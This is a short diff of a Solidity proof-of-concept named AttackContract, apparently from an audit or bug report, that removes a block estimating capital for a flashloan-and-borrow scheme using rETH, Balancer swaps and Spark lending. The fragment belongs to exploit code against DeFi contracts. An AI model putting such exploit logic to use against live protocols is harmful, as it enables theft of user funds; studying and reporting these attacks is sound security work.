@@ -44,21 +44,6 @@ contract AttackContract is PoC {
         fundManagement.toInternalBalance = false;
         balancer.swap(singleSwap, fundManagement, 0, 9999999999999);
 
-
-        // Accounting
-        uint256 outWETH = EthereumTokens.WETH.balanceOf(signer);
-
-        // Calculate required capital based on flashloaning rETH to sell on balancer pool, 
-        // then using wETH to isolate loan rETH through spark finance at 97% ltv
-        // rETH balance that cannot be borrowed is equal to capital required
-        // spark isolated pool lending 97% ltv
-        // https://www.sparkprotocol.io/
-        uint256 rETHExchangeRate = rETH.getEthValue(1 ether);
-        uint256 rETHLoanableWithWETH = outWETH * 97 / (100 * rETHExchangeRate);
-        uint256 tradedAmount = 16500 ether;
-        uint256 cannotBorrow = tradedAmount - rETHLoanableWithWETH;
-        console.log("Cannot borrow: ", cannotBorrow);
-
         EthereumTokens.WETH.approve(address(balancer), 999999999999999 ether);
         
         uint256 maxDepositAmount;
